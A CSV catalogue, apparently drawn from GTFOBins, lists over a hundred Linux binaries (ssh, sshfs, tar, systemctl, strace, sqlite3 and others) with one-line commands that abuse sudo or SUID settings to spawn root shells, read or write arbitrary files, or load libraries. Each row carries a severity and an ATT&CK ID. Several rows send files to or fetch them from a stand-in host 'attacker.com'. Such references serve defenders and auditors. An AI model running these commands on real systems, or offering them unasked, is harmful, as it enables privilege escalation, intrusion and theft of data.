1683,Linux,split -b 999 --additional-suffix suffix /path/to/input-file prefix cat prefixaasuffix,"Abuse the 'split' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/split/
1684,Linux,split -b 999 --additional-suffix suffix /path/to/input-file prefix,"Abuse the 'split' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/split/
1685,Linux,split -b 999 --additional-suffix suffix /path/to/input-file prefix,"Abuse the 'split' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.",SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/split/
1686,Linux,split -b 999 --additional-suffix suffix /path/to/input-file prefix,"Abuse the 'split' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. This copies the input file in the current working directory in a file named `prefixaasuffix`, just make sure to pick a value big enough, instead of `999`.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/split/
1687,Linux,split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts,Abuse the 'split' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/split/
1688,Linux,split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts,Abuse the 'split' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/split/
1689,Linux,split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts,Abuse the 'split' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/split/
1690,Linux,sqlite3 <<EOF CREATE TABLE x(x TEXT); .import /path/to/input-file x SELECT * FROM x; EOF,Abuse the 'sqlite3' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/sqlite3/
1691,Linux,sqlite3 <<EOF CREATE TABLE x(x TEXT); .import /path/to/input-file x SELECT * FROM x; EOF,Abuse the 'sqlite3' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/sqlite3/
1692,Linux,sqlite3 <<EOF CREATE TABLE x(x TEXT); .import /path/to/input-file x SELECT * FROM x; EOF,Abuse the 'sqlite3' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/sqlite3/
1693,Linux,"sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select ""DATA"";'",Abuse the 'sqlite3' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/sqlite3/
1694,Linux,"sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select ""DATA"";'",Abuse the 'sqlite3' binary (file write) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/sqlite3/
1695,Linux,"sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select ""DATA"";'",Abuse the 'sqlite3' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/sqlite3/
1696,Linux,sqlite3 /dev/null '.shell /bin/sh',Abuse the 'sqlite3' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/sqlite3/
1697,Linux,sqlite3 /dev/null '.shell /bin/sh',Abuse the 'sqlite3' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/sqlite3/
1698,Linux,sqlite3 /dev/null '.shell /bin/sh',Abuse the 'sqlite3' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/sqlite3/
1699,Linux,sqlmap -u 127.0.0.1 --eval='...',Abuse the 'sqlmap' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`).,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/sqlmap/
1700,Linux,sqlmap -u 127.0.0.1 --eval='...',Abuse the 'sqlmap' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions. This allows to run Python code (`...`).,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/sqlmap/
1701,Linux,ss -a -F /path/to/input-file,Abuse the 'ss' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file content is actually parsed so only a part of the first line is returned as a part of an error message.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ss/
1702,Linux,ss -a -F /path/to/input-file,Abuse the 'ss' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file content is actually parsed so only a part of the first line is returned as a part of an error message.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ss/
1703,Linux,ss -a -F /path/to/input-file,Abuse the 'ss' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file content is actually parsed so only a part of the first line is returned as a part of an error message.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ss/
1704,Linux,"ssh user@attacker.com 'cat /path/to/input-file""",Abuse the 'ssh' binary (download) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ssh/
1705,Linux,"ssh user@attacker.com 'cat /path/to/input-file""",Abuse the 'ssh' binary (download) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ssh/
1706,Linux,"ssh user@attacker.com 'cat /path/to/input-file""",Abuse the 'ssh' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/ssh/
1707,Linux,ssh -F /path/to/input-file x,Abuse the 'ssh' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The read file content is corrupted by error prints.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ssh/
1708,Linux,ssh -F /path/to/input-file x,Abuse the 'ssh' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The read file content is corrupted by error prints.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ssh/
1709,Linux,ssh -F /path/to/input-file x,Abuse the 'ssh' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The read file content is corrupted by error prints.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ssh/
1710,Linux,ssh localhost /bin/sh,Abuse the 'ssh' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. Reconnecting may help bypassing restricted shells.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ssh/
1711,Linux,ssh localhost /bin/sh,Abuse the 'ssh' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. Reconnecting may help bypassing restricted shells.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ssh/
1712,Linux,ssh localhost /bin/sh,Abuse the 'ssh' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. Reconnecting may help bypassing restricted shells.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ssh/
1713,Linux,ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x,Abuse the 'ssh' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ssh/
1714,Linux,ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x,Abuse the 'ssh' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ssh/
1715,Linux,ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost,"Abuse the 'ssh' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. Spawn the shell on the client, but still requires a successful remote connection.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ssh/
1716,Linux,ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost,"Abuse the 'ssh' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. Spawn the shell on the client, but still requires a successful remote connection.",Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ssh/
1717,Linux,"echo DATA | ssh user@attacker.com 'cat >/path/to/output-file""",Abuse the 'ssh' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/ssh/
1718,Linux,"echo DATA | ssh user@attacker.com 'cat >/path/to/output-file""",Abuse the 'ssh' binary (upload) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/ssh/
1719,Linux,"echo DATA | ssh user@attacker.com 'cat >/path/to/output-file""",Abuse the 'ssh' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/ssh/
1720,Linux,ssh-agent /bin/sh,Abuse the 'ssh-agent' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/ssh-agent/
1721,Linux,ssh-agent /bin/sh -p,Abuse the 'ssh-agent' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/ssh-agent/
1722,Linux,ssh-agent /bin/sh,Abuse the 'ssh-agent' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/ssh-agent/
1723,Linux,ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com,"Abuse the 'ssh-copy-id' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t /path/to/output-file` option can be used.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ssh-copy-id/
1724,Linux,ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com,"Abuse the 'ssh-copy-id' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The input file must have the `.pub` file extension. The file will be copied to `~/.ssh/authorized_keys`, otherwise the `-t /path/to/output-file` option can be used.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ssh-copy-id/
1725,Linux,ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host,Abuse the 'ssh-copy-id' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The input file must have the `.pub` file extension.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/ssh-copy-id/
1726,Linux,ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host,Abuse the 'ssh-copy-id' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The input file must have the `.pub` file extension.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/ssh-copy-id/
1727,Linux,ssh-keygen -D /path/to/lib.so,Abuse the 'ssh-keygen' binary (library load) in a sudo context to escalate privileges or execute arbitrary actions. The shared library must contain the `void C_GetFunctionList() {}` function.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/ssh-keygen/
1728,Linux,ssh-keygen -D /path/to/lib.so,Abuse the 'ssh-keygen' binary (library load) in a suid context to escalate privileges or execute arbitrary actions. The shared library must contain the `void C_GetFunctionList() {}` function.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/ssh-keygen/
1729,Linux,ssh-keygen -D /path/to/lib.so,Abuse the 'ssh-keygen' binary (library load) in a unprivileged context to escalate privileges or execute arbitrary actions. The shared library must contain the `void C_GetFunctionList() {}` function.,Library Load Hijack,Medium,T1574.006,https://gtfobins.github.io/gtfobins/ssh-keygen/
1730,Linux,ssh-keyscan -f /path/to/input-file,Abuse the 'ssh-keyscan' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file content is actually parsed so only a part of each line is returned as a part of an error message.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/ssh-keyscan/
1731,Linux,ssh-keyscan -f /path/to/input-file,Abuse the 'ssh-keyscan' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file content is actually parsed so only a part of each line is returned as a part of an error message.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/ssh-keyscan/
1732,Linux,ssh-keyscan -f /path/to/input-file,Abuse the 'ssh-keyscan' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file content is actually parsed so only a part of each line is returned as a part of an error message.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/ssh-keyscan/
1733,Linux,sshfs -o ssh_command=/path/to/command x: /path/to/dir/,Abuse the 'sshfs' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/sshfs/
1734,Linux,sshfs -o ssh_command=/path/to/command x: /path/to/dir/,Abuse the 'sshfs' binary (command) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary Command Execution,High,T1059,https://gtfobins.github.io/gtfobins/sshfs/
1735,Linux,sshfs user@attacker.com:/ /path/to/dir/ cp /path/to/dir/path/to/input-file /path/to/output-file,Abuse the 'sshfs' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/sshfs/
1736,Linux,echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file chmod +x /path/to/temp-file sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/,Abuse the 'sshfs' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. The mount dir must be writable by the invoking user.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/sshfs/
1737,Linux,echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file chmod +x /path/to/temp-file sshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/,Abuse the 'sshfs' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions. The mount dir must be writable by the invoking user.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/sshfs/
1738,Linux,sshfs user@attacker.com:/ /path/to/dir/ cp /path/to/input-file /path/to/dir/,Abuse the 'sshfs' binary (upload) in a unprivileged context to escalate privileges or execute arbitrary actions.,File Upload,Medium,T1105,https://gtfobins.github.io/gtfobins/sshfs/
1739,Linux,sshpass /bin/sh,Abuse the 'sshpass' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/sshpass/
1740,Linux,sshpass /bin/sh -p,Abuse the 'sshpass' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/sshpass/
1741,Linux,sshpass /bin/sh,Abuse the 'sshpass' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/sshpass/
1742,Linux,"sudo sshuttle -r x --ssh-cmd '/bin/sh -c ""/bin/sh 0<&2 1>&2""' localhost",Abuse the 'sshuttle' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/sshuttle/
1743,Linux,start-stop-daemon -S -x /bin/sh,Abuse the 'start-stop-daemon' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/start-stop-daemon/
1744,Linux,start-stop-daemon -S -x /bin/sh -- -p,Abuse the 'start-stop-daemon' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/start-stop-daemon/
1745,Linux,start-stop-daemon -S -x /bin/sh,Abuse the 'start-stop-daemon' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/start-stop-daemon/
1746,Linux,stdbuf -i0 /bin/sh,Abuse the 'stdbuf' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/stdbuf/
1747,Linux,stdbuf -i0 /bin/sh -p,Abuse the 'stdbuf' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/stdbuf/
1748,Linux,stdbuf -i0 /bin/sh,Abuse the 'stdbuf' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/stdbuf/
1749,Linux,strace -s 999 -o /path/to/output-file strace - DATA,"Abuse the 'strace' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`.",Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/strace/
1750,Linux,strace -s 999 -o /path/to/output-file strace - DATA,"Abuse the 'strace' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The data to be written appears amid the syscall log, quoted and with special characters escaped in octal notation. The string representation will be truncated, pick a value big enough instead of `999`. More generally, any binary that executes whatever syscall passing arbitrary data can be used in place of `strace - DATA`.",Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/strace/
1751,Linux,strace -o /dev/null /bin/sh,Abuse the 'strace' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/strace/
1752,Linux,strace -o /dev/null /bin/sh -p,Abuse the 'strace' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/strace/
1753,Linux,strace -o /dev/null /bin/sh,Abuse the 'strace' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/strace/
1754,Linux,strings /path/to/input-file,Abuse the 'strings' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. This only returns ASCII strings.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/strings/
1755,Linux,strings /path/to/input-file,Abuse the 'strings' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. This only returns ASCII strings.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/strings/
1756,Linux,strings /path/to/input-file,Abuse the 'strings' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. This only returns ASCII strings.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/strings/
1757,Linux,su -c /bin/sh,Abuse the 'su' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/su/
1758,Linux,sudo /bin/sh,Abuse the 'sudo' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/sudo/
1759,Linux,sysctl 'kernel.core_pattern=|/path/to/command',"Abuse the 'sysctl' binary (command) in a sudo context to escalate privileges or execute arbitrary actions. The command is executed by `root` in the background when a core dump occurs. To trigger a core dump, send the `SIGQUIT` signal to a process, for example: ``` sleep infinity & kill -QUIT $! ```",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/sysctl/
1760,Linux,sysctl 'kernel.core_pattern=|/path/to/command',"Abuse the 'sysctl' binary (command) in a suid context to escalate privileges or execute arbitrary actions. The command is executed by `root` in the background when a core dump occurs. To trigger a core dump, send the `SIGQUIT` signal to a process, for example: ``` sleep infinity & kill -QUIT $! ```",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/sysctl/
1761,Linux,"sysctl -n ""/../../path/to/input-file""",Abuse the 'sysctl' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/sysctl/
1762,Linux,"sysctl -n ""/../../path/to/input-file""",Abuse the 'sysctl' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/sysctl/
1763,Linux,"sysctl -n ""/../../path/to/input-file""",Abuse the 'sysctl' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/sysctl/
1764,Linux,systemctl,Abuse the 'systemctl' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/systemctl/
1765,Linux,systemctl,Abuse the 'systemctl' binary (inherit) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/systemctl/
1766,Linux,systemctl,Abuse the 'systemctl' binary (inherit) in a unprivileged context to escalate privileges or execute arbitrary actions.,Privilege Inheritance,Low,T1548,https://gtfobins.github.io/gtfobins/systemctl/
1767,Linux,echo '[Service] Type=oneshot ExecStart=/path/to/command [Install] WantedBy=multi-user.target' >/path/to/temp-file.service systemctl link /path/to/temp-file.service systemctl enable --now /path/to/temp-file.service,"Abuse the 'systemctl' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions. It might happen that the service is not started with `--now`, in such cases it might be necessary to manually start it.",Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/systemctl/
1768,Linux,echo '[Service] Type=oneshot ExecStart=/path/to/command [Install] WantedBy=multi-user.target' >/path/to/temp-file.service systemctl link /path/to/temp-file.service systemctl enable --now /path/to/temp-file.service,"Abuse the 'systemctl' binary (shell) in a suid context to escalate privileges or execute arbitrary actions. It might happen that the service is not started with `--now`, in such cases it might be necessary to manually start it.",SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/systemctl/
1769,Linux,echo /bin/sh >/path/to/temp-file chmod +x /path/to/temp-file SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target,Abuse the 'systemctl' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/systemctl/
1770,Linux,systemd-resolve --status,Abuse the 'systemd-resolve' binary (inherit) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/systemd-resolve/
1771,Linux,systemd-run /path/to/command,Abuse the 'systemd-run' binary (command) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/systemd-run/
1772,Linux,systemd-run -S,Abuse the 'systemd-run' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/systemd-run/
1773,Linux,systemd-run -t /bin/sh,Abuse the 'systemd-run' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/systemd-run/
1774,Linux,tac -s 'RANDOM' /path/to/input-file,Abuse the 'tac' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. Make sure that `RANDOM` does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of `RANDOM`-separated chunks.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/tac/
1775,Linux,tac -s 'RANDOM' /path/to/input-file,Abuse the 'tac' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. Make sure that `RANDOM` does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of `RANDOM`-separated chunks.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/tac/
1776,Linux,tac -s 'RANDOM' /path/to/input-file,Abuse the 'tac' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. Make sure that `RANDOM` does not appear into the file to read otherwise the content of the file is corrupted by reversing the order of `RANDOM`-separated chunks.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/tac/
1777,Linux,tail -c+0 /path/to/input-file,Abuse the 'tail' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/tail/
1778,Linux,tail -c+0 /path/to/input-file,Abuse the 'tail' binary (file read) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/tail/
1779,Linux,tail -c+0 /path/to/input-file,Abuse the 'tail' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions.,Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/tail/
1780,Linux,tailscale serve --http=12345 /path/to/input-file,Abuse the 'tailscale' binary (upload) in a sudo context to escalate privileges or execute arbitrary actions. The URL is reachable by any host of the same Tailnet.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/tailscale/
1781,Linux,tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh,Abuse the 'tar' binary (download) in a sudo context to escalate privileges or execute arbitrary actions. The attacker box must have the `rmt` utility installed.,Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/tar/
1782,Linux,tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh,Abuse the 'tar' binary (download) in a suid context to escalate privileges or execute arbitrary actions. The attacker box must have the `rmt` utility installed.,SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/tar/
1783,Linux,tar xvf user@attacker.com:/path/to/input-file.tar --rsh-command=/bin/ssh,Abuse the 'tar' binary (download) in a unprivileged context to escalate privileges or execute arbitrary actions. The attacker box must have the `rmt` utility installed.,File Download,Low,T1105,https://gtfobins.github.io/gtfobins/tar/
1784,Linux,tar cf /dev/stdout /path/to/input-file -I 'tar xO',"Abuse the 'tar' binary (file read) in a sudo context to escalate privileges or execute arbitrary actions. The file is read then passed to the specified command (e.g., `tar xO`) via standard input.",Sudo Misconfiguration,Medium,T1548.003,https://gtfobins.github.io/gtfobins/tar/
1785,Linux,tar cf /dev/stdout /path/to/input-file -I 'tar xO',"Abuse the 'tar' binary (file read) in a suid context to escalate privileges or execute arbitrary actions. The file is read then passed to the specified command (e.g., `tar xO`) via standard input.",SUID Binaries,Medium,T1548.001,https://gtfobins.github.io/gtfobins/tar/
1786,Linux,tar cf /dev/stdout /path/to/input-file -I 'tar xO',"Abuse the 'tar' binary (file read) in a unprivileged context to escalate privileges or execute arbitrary actions. The file is read then passed to the specified command (e.g., `tar xO`) via standard input.",Arbitrary File Read,Low,T1552,https://gtfobins.github.io/gtfobins/tar/
1787,Linux,echo DATA >/path/to/temp-file tar cf /path/to/temp-file.tar /path/to/temp-file tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@,Abuse the 'tar' binary (file write) in a sudo context to escalate privileges or execute arbitrary actions. The archive can also be prepared offline then uploaded to the target.,Sudo Misconfiguration,High,T1548.003,https://gtfobins.github.io/gtfobins/tar/
1788,Linux,echo DATA >/path/to/temp-file tar cf /path/to/temp-file.tar /path/to/temp-file tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@,Abuse the 'tar' binary (file write) in a suid context to escalate privileges or execute arbitrary actions. The archive can also be prepared offline then uploaded to the target.,SUID Binaries,High,T1548.001,https://gtfobins.github.io/gtfobins/tar/
1789,Linux,echo DATA >/path/to/temp-file tar cf /path/to/temp-file.tar /path/to/temp-file tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@,Abuse the 'tar' binary (file write) in a unprivileged context to escalate privileges or execute arbitrary actions. The archive can also be prepared offline then uploaded to the target.,Arbitrary File Write,Medium,T1222,https://gtfobins.github.io/gtfobins/tar/
1790,Linux,tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,Abuse the 'tar' binary (shell) in a sudo context to escalate privileges or execute arbitrary actions.,Sudo Misconfiguration,Critical,T1548.003,https://gtfobins.github.io/gtfobins/tar/
1791,Linux,tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,Abuse the 'tar' binary (shell) in a suid context to escalate privileges or execute arbitrary actions.,SUID Binaries,Critical,T1548.001,https://gtfobins.github.io/gtfobins/tar/
1792,Linux,tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh,Abuse the 'tar' binary (shell) in a unprivileged context to escalate privileges or execute arbitrary actions.,Shell Escape,High,T1548,https://gtfobins.github.io/gtfobins/tar/
